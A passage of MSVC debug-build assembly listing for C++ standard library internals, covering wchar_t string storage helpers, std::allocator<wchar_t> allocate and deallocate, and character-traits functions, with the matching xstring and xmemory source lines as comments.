?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer, COMDAT

; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }

  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
tv66 = 192
this$ = 240
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged, COMDAT

; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2244 :         return _Myres > _Small_string_capacity;

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 18 07	 cmp	 QWORD PTR [rax+24], 7
  0002b	76 0c		 jbe	 SHORT $LN3@Large_mode
  0002d	c7 85 c0 00 00
	00 01 00 00 00	 mov	 DWORD PTR tv66[rbp], 1
  00037	eb 0a		 jmp	 SHORT $LN4@Large_mode
$LN3@Large_mode:
  00039	c7 85 c0 00 00
	00 00 00 00 00	 mov	 DWORD PTR tv66[rbp], 0
$LN4@Large_mode:
  00043	0f b6 85 c0 00
	00 00		 movzx	 eax, BYTE PTR tv66[rbp]

; 2245 :     }

  0004a	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ
_TEXT	SEGMENT
_Result$ = 8
this$ = 256
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2235 :         const value_type* _Result = _Bx._Buf;

  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax

; 2236 :         if (_Large_mode_engaged()) {

  0002a	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00031	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00036	0f b6 c0	 movzx	 eax, al
  00039	85 c0		 test	 eax, eax
  0003b	74 13		 je	 SHORT $LN2@Myptr

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0003d	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00047	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0004c	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax
$LN2@Myptr:

; 2238 :         }
; 2239 : 
; 2240 :         return _Result;

  00050	48 8b 45 08	 mov	 rax, QWORD PTR _Result$[rbp]

; 2241 :     }

  00054	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
_Result$ = 8
this$ = 256
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {

$LN4:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2226 :         value_type* _Result = _Bx._Buf;

  0001f	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax

; 2227 :         if (_Large_mode_engaged()) {

  0002a	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00031	e8 00 00 00 00	 call	 ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
  00036	0f b6 c0	 movzx	 eax, al
  00039	85 c0		 test	 eax, eax
  0003b	74 13		 je	 SHORT $LN2@Myptr

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  0003d	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8b 08	 mov	 rcx, QWORD PTR [rax]
  00047	e8 00 00 00 00	 call	 ??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z ; std::_Unfancy<wchar_t>
  0004c	48 89 45 08	 mov	 QWORD PTR _Result$[rbp], rax
$LN2@Myptr:

; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

  00050	48 8b 45 08	 mov	 rax, QWORD PTR _Result$[rbp]

; 2232 :     }

  00054	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  0005b	5f		 pop	 rdi
  0005c	5d		 pop	 rbp
  0005d	c3		 ret	 0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >, COMDAT

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8b c8	 mov	 rcx, rax
  00029	e8 00 00 00 00	 call	 ??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty

; 2213 : 
; 2214 :     // length of internal buffer, [1, 16] (NB: used by the debugger visualizer)
; 2215 :     static constexpr size_type _BUF_SIZE = 16 / sizeof(value_type) < 1 ? 1 : 16 / sizeof(value_type);
; 2216 :     // roundup mask for allocated buffers, [0, 15]
; 2217 :     static constexpr size_type _Alloc_mask = sizeof(value_type) <= 1 ? 15
; 2218 :                                            : sizeof(value_type) <= 2 ? 7
; 2219 :                                            : sizeof(value_type) <= 4 ? 3
; 2220 :                                            : sizeof(value_type) <= 8 ? 1
; 2221 :                                                                      : 0;
; 2222 :     // capacity in small mode
; 2223 :     static constexpr size_type _Small_string_capacity = _BUF_SIZE - 1;
; 2224 : 
; 2225 :     _NODISCARD _CONSTEXPR20 value_type* _Myptr() noexcept {
; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {
; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;
; 2232 :     }
; 2233 : 
; 2234 :     _NODISCARD _CONSTEXPR20 const value_type* _Myptr() const noexcept {
; 2235 :         const value_type* _Result = _Bx._Buf;
; 2236 :         if (_Large_mode_engaged()) {
; 2237 :             _Result = _Unfancy(_Bx._Ptr);
; 2238 :         }
; 2239 : 
; 2240 :         return _Result;
; 2241 :     }
; 2242 : 
; 2243 :     _NODISCARD _CONSTEXPR20 bool _Large_mode_engaged() const noexcept {
; 2244 :         return _Myres > _Small_string_capacity;
; 2245 :     }
; 2246 : 
; 2247 :     _CONSTEXPR20 void _Activate_SSO_buffer() noexcept {
; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }
; 2257 : 
; 2258 :     _CONSTEXPR20 void _Check_offset(const size_type _Off) const {
; 2259 :         // checks whether _Off is in the bounds of [0, size()]
; 2260 :         if (_Mysize < _Off) {
; 2261 :             _Xran();
; 2262 :         }
; 2263 :     }
; 2264 : 
; 2265 :     _CONSTEXPR20 void _Check_offset_exclusive(const size_type _Off) const {
; 2266 :         // checks whether _Off is in the bounds of [0, size())
; 2267 :         if (_Mysize <= _Off) {
; 2268 :             _Xran();
; 2269 :         }
; 2270 :     }
; 2271 : 
; 2272 :     [[noreturn]] static void _Xran() {
; 2273 :         _Xout_of_range("invalid string position");
; 2274 :     }
; 2275 : 
; 2276 :     _NODISCARD _CONSTEXPR20 size_type _Clamp_suffix_size(const size_type _Off, const size_type _Size) const noexcept {
; 2277 :         // trims _Size to the longest it can be assuming a string at/after _Off
; 2278 :         return (_STD min)(_Size, _Mysize - _Off);
; 2279 :     }
; 2280 : 
; 2281 :     union _Bxty { // storage for small buffer or pointer to larger one
; 2282 :         // This constructor previously initialized _Ptr. Don't rely on the new behavior without
; 2283 :         // renaming `_String_val` (and fixing the visualizer).
; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers
; 2285 :         _CONSTEXPR20 ~_Bxty() noexcept {} // user-provided, for fancy pointers
; 2286 : 
; 2287 :         value_type _Buf[_BUF_SIZE];
; 2288 :         pointer _Ptr;
; 2289 :         char _Alias[_BUF_SIZE]; // TRANSITION, ABI: _Alias is preserved for binary compatibility (especially /clr)
; 2290 : 
; 2291 :         _CONSTEXPR20 void _Switch_to_buf() noexcept {
; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }
; 2303 :     };
; 2304 :     _Bxty _Bx;
; 2305 : 
; 2306 :     // invariant: _Myres >= _Mysize, and _Myres >= _Small_string_capacity (after string's construction)
; 2307 :     // neither _Mysize nor _Myres takes account of the extra null terminator
; 2308 :     size_type _Mysize = 0; // current length of string (size)

  0002e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00035	48 c7 40 10 00
	00 00 00	 mov	 QWORD PTR [rax+16], 0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 c7 40 18 00
	00 00 00	 mov	 QWORD PTR [rax+24], 0

; 2212 :     _CONSTEXPR20 _String_val() noexcept : _Bx() {}

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005a	5f		 pop	 rdi
  0005b	5d		 pop	 rbp
  0005c	c3		 ret	 0
??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z
_TEXT	SEGMENT
__formal$ = 224
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z PROC ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size, COMDAT

; 740  :     _NODISCARD static _CONSTEXPR20 size_type max_size(const _Alloc&) noexcept {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 741  :         return static_cast<size_t>(-1) / sizeof(value_type);

  0001f	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 742  :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ENDP ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Count$ = 232
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z PROC	; std::allocator<wchar_t>::allocate, COMDAT

; 980  :     _NODISCARD_RAW_PTR_ALLOC _CONSTEXPR20 __declspec(allocator) _Ty* allocate(_CRT_GUARDOVERFLOW const size_t _Count) {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 981  :         static_assert(sizeof(value_type) > 0, "value_type must be complete before calling allocate.");
; 982  :         return static_cast<_Ty*>(_Allocate<_New_alignof<_Ty>>(_Get_size_of_n<sizeof(_Ty)>(_Count)));

  00024	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Count$[rbp]
  0002b	e8 00 00 00 00	 call	 ??$_Get_size_of_n@$01@std@@YA_K_K@Z ; std::_Get_size_of_n<2>
  00030	48 8b c8	 mov	 rcx, rax
  00033	e8 00 00 00 00	 call	 ??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z ; std::_Allocate<16,std::_Default_allocate_traits,0>

; 983  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z ENDP	; std::allocator<wchar_t>::allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
_TEXT	SEGMENT
this$ = 224
_Ptr$ = 232
_Count$ = 240
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z PROC	; std::allocator<wchar_t>::deallocate, COMDAT

; 974  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 975  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 976  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00029	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR _Count$[rbp]
  00030	48 d1 e0	 shl	 rax, 1
  00033	48 8b d0	 mov	 rdx, rax
  00036	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Ptr$[rbp]
  0003d	e8 00 00 00 00	 call	 ??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z ; std::_Deallocate<16,0>

; 978  :     }

  00042	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00049	5f		 pop	 rdi
  0004a	5d		 pop	 rbp
  0004b	c3		 ret	 0
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ENDP	; std::allocator<wchar_t>::deallocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ??0?$allocator@_W@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0?$allocator@_W@std@@QEAA@XZ PROC			; std::allocator<wchar_t>::allocator<wchar_t>, COMDAT

; 966  :     constexpr allocator() noexcept {}

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002d	5f		 pop	 rdi
  0002e	5d		 pop	 rbp
  0002f	c3		 ret	 0
??0?$allocator@_W@std@@QEAA@XZ ENDP			; std::allocator<wchar_t>::allocator<wchar_t>
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?_Xlen_string@std@@YAXXZ
_TEXT	SEGMENT
?_Xlen_string@std@@YAXXZ PROC				; std::_Xlen_string, COMDAT

; 2326 : [[noreturn]] inline void _Xlen_string() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 2327 :     _Xlength_error("string too long");

  0001b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_C@_0BA@JFNIOLAK@string?5too?5long@
  00022	e8 00 00 00 00	 call	 ?_Xlength_error@std@@YAXPEBD@Z ; std::_Xlength_error
$LN2@Xlen_strin:

; 2328 : }

  00027	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002e	5f		 pop	 rdi
  0002f	5d		 pop	 rbp
  00030	c3		 ret	 0
?_Xlen_string@std@@YAXXZ ENDP				; std::_Xlen_string
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 224
_Right$ = 232
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 294  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;

  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR _Left$[rbp]
  0002b	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Right$[rbp]
  00032	0f b7 09	 movzx	 ecx, WORD PTR [rcx]
  00035	66 89 08	 mov	 WORD PTR [rax], cx

; 301  :     }

  00038	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0003f	5f		 pop	 rdi
  00040	5d		 pop	 rbp
  00041	c3		 ret	 0
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z
_TEXT	SEGMENT
_First$ = 224
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z PROC	; std::_WChar_traits<wchar_t>::length, COMDAT

; 255  :     _NODISCARD static _CONSTEXPR17 size_t length(_In_z_ const _Elem* _First) noexcept /* strengthened */ {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 256  :         // find length of null-terminated sequence
; 257  : #if _HAS_CXX17
; 258  :         if constexpr (is_same_v<_Elem, wchar_t>) {
; 259  :             return __builtin_wcslen(_First);
; 260  :         } else {
; 261  :             return _Primary_char_traits::length(_First);
; 262  :         }
; 263  : #else // ^^^ _HAS_CXX17 / !_HAS_CXX17 vvv
; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _First$[rbp]
  00026	e8 00 00 00 00	 call	 wcslen

; 265  : #endif // ^^^ !_HAS_CXX17 ^^^
; 266  :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z
_TEXT	SEGMENT
_First1$ = 224
_First2$ = 232
_Count$ = 240
?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z PROC ; std::_Char_traits<wchar_t,unsigned short>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

$LN3:
  00000	4c 89 44 24 18	 mov	 QWORD PTR [rsp+24], r8
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__31746AB4_xstring
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
